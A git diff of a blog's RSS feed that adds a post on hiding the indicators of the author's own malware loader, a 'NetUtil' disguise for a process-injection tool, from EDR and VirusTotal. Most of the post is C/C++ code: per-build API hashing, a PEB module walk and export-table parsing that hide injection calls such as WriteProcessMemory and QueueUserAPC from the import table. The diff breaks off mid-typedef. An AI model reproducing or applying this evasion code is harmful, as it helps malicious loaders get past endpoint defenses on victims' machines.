@@ -6,7 +6,599 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Just adhere to [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)</copyright>
-    <lastBuildDate>Sat, 21 Mar 2026 01:26:34 -0400</lastBuildDate><atom:link href="https://ashtrace.github.io/index.xml" rel="self" type="application/rss+xml" /><icon>https://ashtrace.github.io/logo.svg</icon>
+    <lastBuildDate>Thu, 30 Apr 2026 21:44:31 -0400</lastBuildDate><atom:link href="https://ashtrace.github.io/index.xml" rel="self" type="application/rss+xml" /><icon>https://ashtrace.github.io/logo.svg</icon>
+    
+    
+    <item>
+      <title>Stripping the Binary Clean: Hiding the malware indicators</title>
+      <link>https://ashtrace.github.io/posts/stripping_iocs/</link>
+      <pubDate>Thu, 30 Apr 2026 21:44:31 -0400</pubDate>
+      
+      <guid>https://ashtrace.github.io/posts/stripping_iocs/</guid>
+      <description><![CDATA[<p>In my last attempt to build a loader while I did land to no detections over free-tier elastic defend EDR capabilities there were a <em>lot</em> of nuances. The &lsquo;release&rsquo; build was detected and literally had the PDB path with the word <code>loader</code> embedded into the binary. Professional hacker momemnts. The following is my attempt of stripping the binary clean of possible indicators of malicious behaviour.</p>
+<h2 id="what-indicators">What Indicators?</h2>
+<p>The virustotal scan for the last build of the loader demonstrated that disassembling/decompilation capabilities through <code>code insights</code> provided following insights into the binary:</p>
+<p><img src="./NetUtil4-virustotal.png" alt="NetUtil4-virustotal"></p>
+<p>As I was sticking to the pseudo-identity of network utility tool called <code>NetUtil</code> thus my first targets where WinAPIs being used for remote mapping injection and APC injection. The WinInet functions, being used to fetch the payload, were not an immidiate issue for me.</p>
+<h2 id="api-hashing-for-iat-hiding">API Hashing for IAT Hiding</h2>
+<p>The well-known-personalities-in-the-malware-world functions of <code>CreateProcess</code>, <code>WriteProcessMemory</code>, <code>CreateFileMapping</code>, <code>MapViewOfFile</code>, <code>MapViewOfFile2</code>, <code>QueuerUserAPC</code>, <code>DebugActiveProcessStop</code> where present in the import address table of the binary which would&rsquo;ve provided easy indicators to any scanner.</p>
+<p>To resolve these functions through DLL module walking at runtime; levaraging a unique hash value for each of the functions mentioned was my goto approach to hide them from IAT.</p>
+<h3 id="hash-functions">Hash Functions</h3>
+<p>I wanted a compile-time hashing capability that would help me to deduce a random seed value for every build that is compiled thus eliminating the constant hashes across builds (another possible indicator in the longer run).</p>
+<p>The <code>constexpr</code> expressions in C++ do allow the flexibility of compile-time evaluation of statements but came at the cost of adding C++ to until-now a C project.</p>
+<p>Furthermore, the <code>constexpr</code> expressions require no involvement of functions that are to be resolved from a shared module. The entire expression should exist entirely and depend on functions in the existing code-base. This somewhat limited the available hash function options to me.</p>
+<p>I browsed through the <a href="https://github.com/vxunderground/vx-api">VX-API</a> repository and landed on <code>HashStringFowlerNollVoVariant1a</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ULONG <span style="color:#a6e22e">HashStringFowlerNollVoVariant1aA</span>(_In_ LPCSTR String)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	ULONG Hash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x811c9dc5</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>String)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		Hash <span style="color:#f92672">^=</span> (UCHAR)<span style="color:#f92672">*</span>String<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>		Hash <span style="color:#f92672">*=</span> <span style="color:#ae81ff">0x01000193</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> Hash;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I added a little modification to make the function case-insensitive as there might be some difference between how I write the module name compared to the module name populated by the loader at runtime.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>constexpr ULONG <span style="color:#a6e22e">HashStringFowlerNollVoVariant1aA</span>(IN LPCSTR String)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	ULONG Hash <span style="color:#f92672">=</span> g_InitHash;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>String)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		UCHAR c <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>String<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">&amp;&amp;</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;Z&#39;</span>)
+</span></span><span style="display:flex;"><span>			Hash <span style="color:#f92672">^=</span> c <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>			Hash <span style="color:#f92672">^=</span> c;
+</span></span><span style="display:flex;"><span>		Hash <span style="color:#f92672">*=</span> <span style="color:#ae81ff">0x01000193</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> Hash;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Notice the <code>constexpr</code> prefix for compile time evaluation. The wide-character version <code>HashStringFowlerNollVoVariant1aW</code> worked similarly. Both the implementations start with an initial hash <code>g_InitHash</code> value. This is a global variable containing the random-seed I described the need for. It is derived from the time of compilation as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>constexpr ULONG <span style="color:#a6e22e">RandomCompileTimeSeed</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		(__TIME__[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>		(__TIME__[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>		(__TIME__[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>		(__TIME__[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">600</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>		(__TIME__[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3600</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>		(__TIME__[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">36000</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>constexpr ULONG g_InitHash <span style="color:#f92672">=</span> <span style="color:#a6e22e">RandomCompileTimeSeed</span>();
+</span></span></code></pre></div><p>Now that I look at it, I should&rsquo;ve added date of compilation too, well there&rsquo;s always next time.</p>
+<p>I also defined some helper macros to leverage these hash functions both at the compile-time and during execution at runtime.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Compile-time macros to define the hash values for WinAPI functions
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// It defines variables at compile time with the format:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//			constexpr auto WinApiFuncName_FnvvA/W = HashValue
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CTIME_HFOWLERA(API) constexpr auto API##_FnvvA = HashStringFowlerNollVoVariant1aA((LPCSTR) #API);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CTIME_HFOWLERW(API) constexpr auto API##_FnvvW = HashStringFowlerNollVoVariant1aW((LPCWSTR) L#API);
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Runtime macros to call respective hash function during WinAPI resolution
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define	RTIME_HFOWLERA(API) HashStringFowlerNollVoVariant1aA((LPCSTR)API)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define RTIME_HFOWLERW(API) HashStringFowlerNollVoVariant1aW((LPCWSTR)API)
+</span></span></span></code></pre></div><p>The <code>CTIME_HFOWLERA</code> macros create variables at compile time with <code>_FnnvA</code> suffix or <code>_FnvvW</code> suffix onto the function name for which the hash function was called.</p>
+<h3 id="the-runtime-resolution-logic">The runtime-resolution logic</h3>
+<p>A basic approach to retrieve function address is to define the function signature as a type and populate a pointer to that type using <code>GetModuleHandle</code> and <code>GetProcAddress</code> calls.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE      moduleHandle    <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">&#34;moduleName&#34;</span>);
+</span></span><span style="display:flex;"><span>funcType    funcPtr         <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetProcAddress</span>(moduleHandle, <span style="color:#e6db74">&#34;functionName&#34;</span>);
+</span></span></code></pre></div><p>Thus, I needed custom implmentations that would work as follows</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE      moduleHandle    <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetModuleHandleCustom</span>(moduleNameHash);
+</span></span><span style="display:flex;"><span>functype    funcPtr         <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetProcAddressCustom</span>(moduleHandle, functionNameHash);
+</span></span></code></pre></div><h4 id="getmodulehandlecustom">GetModuleHandleCustom</h4>
+<p>I defined a structure to store an internal representation of module.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// My representation of a Module; helps to cache some attributes
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	HMODULE	ModuleHandle;			<span style="color:#75715e">// DllBase
+</span></span></span><span style="display:flex;"><span>	ULONG	ModuleHash;				<span style="color:#75715e">// FowlerNollVoVariant1a hash of module name
+</span></span></span><span style="display:flex;"><span>	DWORD	NumberOfFunctions;		<span style="color:#75715e">// Count of the functions in the module
+</span></span></span><span style="display:flex;"><span>	PDWORD	FunctionNameArray;		<span style="color:#75715e">// Array of function names
+</span></span></span><span style="display:flex;"><span>	PDWORD	FunctionAddressArray;	<span style="color:#75715e">// Array of function addresses
+</span></span></span><span style="display:flex;"><span>	PWORD	FunctionOrdinalArray;	<span style="color:#75715e">// Array of function indexes
+</span></span></span><span style="display:flex;"><span>} WINAPI_MODULE, <span style="color:#f92672">*</span> PWINAPI_MODULE;
+</span></span></code></pre></div><p>The caller function populates a structure of <code>WINAPI_MODULE</code> with module name&rsquo;s hash in <code>ModuleHash</code> for each module to be resolved. Next, pointer to this structure is passed onto the following <code>GetModuleHandleCustom</code> function which:</p>
+<ul>
+<li>fetches the process environment block for the currently running process</li>
+<li>parses the <code>PEB_LDR_DATA</code> for modules loaded into the process.</li>
+<li>compares each module&rsquo;s base name&rsquo;s hash to the provided hash.</li>
+<li>if the check succeeds, populates the <code>ModuleHandle</code> with the base address of the module.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetModuleHandleCustom</span>(
+</span></span><span style="display:flex;"><span>	IN	PWINAPI_MODULE	pWinApiMod
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pWinApiMod <span style="color:#f92672">||</span> pWinApiMod<span style="color:#f92672">-&gt;</span>ModuleHash <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _WIN64
+</span></span></span><span style="display:flex;"><span>	PPEB	pPeb <span style="color:#f92672">=</span> (PPEB)(<span style="color:#a6e22e">__readgsqword</span>(<span style="color:#ae81ff">0x60</span>));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#elif _WIN32
+</span></span></span><span style="display:flex;"><span>	PPEB	pPeb <span style="color:#f92672">=</span> (PPEB)(<span style="color:#a6e22e">__readfsdword</span>(<span style="color:#ae81ff">0x30</span>));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif </span><span style="color:#75715e">// _WIN64
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PPEB_LDR_DATA	pLdr		<span style="color:#f92672">=</span> (PPEB_LDR_DATA)(pPeb<span style="color:#f92672">-&gt;</span>Ldr);
+</span></span><span style="display:flex;"><span>	PLIST_ENTRY		pDteHead	<span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>(pLdr<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList);
+</span></span><span style="display:flex;"><span>	PLIST_ENTRY		pDteCurrent <span style="color:#f92672">=</span> pDteHead<span style="color:#f92672">-&gt;</span>Flink;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>		PLDR_DATA_TABLE_ENTRY	pDte <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)((PBYTE)pDteCurrent<span style="color:#f92672">-</span> <span style="color:#a6e22e">offsetof</span>(LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (pDte<span style="color:#f92672">-&gt;</span>BaseDllName.Length <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">RTIME_HFOWLERW</span>(pDte<span style="color:#f92672">-&gt;</span>BaseDllName.Buffer) <span style="color:#f92672">==</span> pWinApiMod<span style="color:#f92672">-&gt;</span>ModuleHash) {
+</span></span><span style="display:flex;"><span>				pWinApiMod<span style="color:#f92672">-&gt;</span>ModuleHandle <span style="color:#f92672">=</span> (HMODULE)pDte<span style="color:#f92672">-&gt;</span>DllBase;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		pDteCurrent <span style="color:#f92672">=</span> pDteCurrent<span style="color:#f92672">-&gt;</span>Flink;
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">while</span> (pDteCurrent <span style="color:#f92672">!=</span> pDteHead);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="getprocaddresscustom">GetProcAddressCustom</h4>
+<p>The <code>GetProcAddressCustom</code> implementation expects pointer to structure populated by <code>GetModuleHandleCustom</code> and hash of the function name. Next, it:</p>
+<ul>
+<li>checks if the module was already parsed and required arrays have been resolved.</li>
+<li>if not, (in case of first call for a module), it parses the DLL PE image and sets the <code>NumberOfFunctions</code>, <code>FunctionNameArray</code>, <code>FunctionAddressArray</code>, <code>FunctionOrdinalArray</code> values that are to be used directy in subsequent calls.</li>
+<li>it iterates over each function name and compares their hash to the provided hash value.</li>
+<li>if the check succeeds, it fetches and returns the address for the target function within the module.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>FARPROC <span style="color:#a6e22e">GetProcAddressCustom</span>(
+</span></span><span style="display:flex;"><span>	IN OUT	PWINAPI_MODULE	pWinApiMod,
+</span></span><span style="display:flex;"><span>	IN		ULONG			uApiHash
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	PBYTE	pBase <span style="color:#f92672">=</span> (PBYTE)(pWinApiMod<span style="color:#f92672">-&gt;</span>ModuleHandle);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pWinApiMod<span style="color:#f92672">-&gt;</span>NumberOfFunctions <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		PIMAGE_DOS_HEADER	pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (pImgDosHdr<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		PIMAGE_NT_HEADERS	pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (pImgNtHdrs<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		IMAGE_OPTIONAL_HEADER	ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
+</span></span><span style="display:flex;"><span>		PIMAGE_EXPORT_DIRECTORY	pImgExpDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		pWinApiMod<span style="color:#f92672">-&gt;</span>NumberOfFunctions	 <span style="color:#f92672">=</span> pImgExpDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions;
+</span></span><span style="display:flex;"><span>		pWinApiMod<span style="color:#f92672">-&gt;</span>FunctionNameArray	 <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExpDir<span style="color:#f92672">-&gt;</span>AddressOfNames);
+</span></span><span style="display:flex;"><span>		pWinApiMod<span style="color:#f92672">-&gt;</span>FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExpDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
+</span></span><span style="display:flex;"><span>		pWinApiMod<span style="color:#f92672">-&gt;</span>FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD )(pBase <span style="color:#f92672">+</span> pImgExpDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pWinApiMod<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> pWinApiMod<span style="color:#f92672">-&gt;</span>FunctionNameArray[i]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">RTIME_HFOWLERA</span>(pFunctionName) <span style="color:#f92672">==</span> uApiHash) {
+</span></span><span style="display:flex;"><span>			PVOID pFunctionAddr <span style="color:#f92672">=</span> (PVOID)(pBase <span style="color:#f92672">+</span> pWinApiMod<span style="color:#f92672">-&gt;</span>FunctionAddressArray[pWinApiMod<span style="color:#f92672">-&gt;</span>FunctionOrdinalArray[i]]);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> (FARPROC)pFunctionAddr;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="sticking-the-pieces-together">Sticking the pieces together</h4>
+<p>The program uses <code>CTIME_HFOWLERW</code> macros to define WinAPI function hashes at compile time. I also calculated hashes for the module names, to remove hardcoded strings with module names and leverage custom implementation of <code>GetModuleHandle</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// define hashes for the WinAPI functions at compile-time
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">CTIME_HFOWLERW</span>(CreateProcessW);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CTIME_HFOWLERW</span>(WriteProcessMemory);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CTIME_HFOWLERW</span>(CreateFileMappingW);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CTIME_HFOWLERW</span>(MapViewOfFile);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CTIME_HFOWLERW</span>(MapViewOfFileNuma2);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CTIME_HFOWLERW</span>(QueueUserAPC);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CTIME_HFOWLERW</span>(DebugActiveProcessStop);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// define hash for kernel32.dll and kernelbase.dll at compile-time
+</span></span></span><span style="display:flex;"><span>constexpr ULONG KERNEL32_DLL_FnvvW		<span style="color:#f92672">=</span> <span style="color:#a6e22e">HashStringFowlerNollVoVariant1aW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;KERNEL32.DLL&#34;</span>);
+</span></span><span style="display:flex;"><span>constexpr ULONG	KERNELBASE_DLL_FnnvW	<span style="color:#f92672">=</span> <span style="color:#a6e22e">HashStringFowlerNollVoVariant1aW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;KERNELBASE.DLL&#34;</span>);
+</span></span></code></pre></div><p>Next, I created a structure - <code>H_API</code>, to hold the <em>pointers-of-interest</em> i.e. function pointers to each function that would be resolved through their hash.</p>
+<p>And it was at this moment I realised that <code>MapViewOfFile2</code> is a wrapper over <code>MapViewOfFileNuma2</code>. NUMA or <strong>Non-Uniform Memory Access</strong> is a fancy term to explain that in multi-processor system accessing local memory memory of a CPU is faster than accessing memory of another CPU - thus the non-uniformity. Numa node specifies the memory where the mapped section would reside. For our intent and purposes we&rsquo;d hardcode it to <code>NUMA_NO_PREFERRED_NODE</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// My representation of collection of all hashed functions
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	fnCreateProcessW			pCreateProcessW;			<span style="color:#75715e">// from kernel32.dll
+</span></span></span><span style="display:flex;"><span>	fnWriteProcessMemory		pWriteProcessMemory;		<span style="color:#75715e">// from kernel32.dll
+</span></span></span><span style="display:flex;"><span>	fnCreateFileMappingW		pCreateFileMappingW;		<span style="color:#75715e">// from kernel32.dll
+</span></span></span><span style="display:flex;"><span>	fnMapViewOfFile				pMapViewOfFile;				<span style="color:#75715e">// from kernel32.dll
+</span></span></span><span style="display:flex;"><span>	fnQueueUserAPC				pQueueUserAPC;				<span style="color:#75715e">// from kernel32.dll
+</span></span></span><span style="display:flex;"><span>	fnDebugActiveProcessStop	pDebugActiveProcessStop;	<span style="color:#75715e">// from kernel32.dll
+</span></span></span><span style="display:flex;"><span>	fnMapViewOfFileNuma2		pMapViewOfFileNuma2;		<span style="color:#75715e">// from kernelbase.dll
+</span></span></span><span style="display:flex;"><span>} H_API, <span style="color:#f92672">*</span> PH_API;
+</span></span></code></pre></div><p>Each function type definition was sourced from microsoft documentation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span> fnCreateProcessW)(
+</span></span><span style="display:flex;"><span>	IN		OPTIONAL	LPCWSTR               lpApplicationName,
+</span></span><span style="display:flex;"><span>	IN	OUT	OPTIONAL	LPWSTR                lpCommandLine,
+</span></span><span style="display:flex;"><span>	IN		OPTIONAL    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+</span></span><span style="display:flex;"><span>	IN		OPTIONAL    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+</span></span><span style="display:flex;"><span>	IN					BOOL                  bInheritHandles,
+</span></span><span style="display:flex;"><span>	IN					DWORD                 dwCreationFlags,
+</span></span><span style="display:flex;"><span>	IN		OPTIONAL    LPVOID                lpEnvironment,
+</span></span><span style="display:flex;"><span>	IN		OPTIONAL    LPCWSTR               lpCurrentDirectory,
+</span></span><span style="display:flex;"><span>	IN					LPSTARTUPINFOW        lpStartupInfo,
+</span></span><span style="display:flex;"><span>	OUT					LPPROCESS_INFORMATION lpProcessInformation
+</span></span><span style="display:flex;"><span>	);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span> fnWriteProcessMemory)(
+</span></span><span style="display:flex;"><span>	IN  HANDLE  hProcess,
+</span></span><span style="display:flex;"><span>	IN  LPVOID  lpBaseAddress,
+</span></span><span style="display:flex;"><span>	IN  LPCVOID lpBuffer,
+</span></span><span style="display:flex;"><span>	IN  SIZE_T  nSize,
+</span></span><span style="display:flex;"><span>	OUT SIZE_T<span style="color:#f92672">*</span> lpNumberOfBytesWritten
+</span></span><span style="display:flex;"><span>	);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-createfilemappingw
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">HANDLE</span>(WINAPI<span style="color:#f92672">*</span> fnCreateFileMappingW)(
+</span></span><span style="display:flex;"><span>	IN           HANDLE                hFile,
+</span></span><span style="display:flex;"><span>	IN	OPTIONAL LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
